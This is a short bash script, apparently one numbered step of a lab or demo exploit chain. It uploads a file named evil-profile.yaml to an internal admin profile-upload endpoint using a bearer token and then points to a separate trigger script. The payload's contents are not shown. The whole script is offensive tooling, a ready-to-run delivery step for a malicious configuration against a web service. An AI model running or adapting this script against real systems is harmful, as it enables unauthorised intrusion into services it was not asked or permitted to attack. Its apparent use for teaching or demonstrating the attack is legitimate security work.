#!/usr/bin/env bash
# Step 7+8: Upload evil diagnostic-profile.yaml to internal profile upload endpoint.
# Usage: TARGET=<host:port> TOKEN=<token> ./04-upload-evil-profile.sh
TARGET="${TARGET:-localhost:8080}"
TOKEN="${TOKEN:-demo-profile-admin-token-2026}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PAYLOAD="${SCRIPT_DIR}/evil-profile.yaml"

if [[ ! -f "$PAYLOAD" ]]; then
  echo "[!] evil-profile.yaml not found. Run generate-evil-profile.sh first."
  exit 1
fi

echo "=== [Step 7+8] Upload evil profile ==="
curl -s -X POST \
  "http://${TARGET}/internal/admin/profile/upload" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/x-yaml" \
  --data-binary "@${PAYLOAD}"
echo ""
echo "[*] Profile uploaded. Next: trigger analysis with 05-trigger.sh"
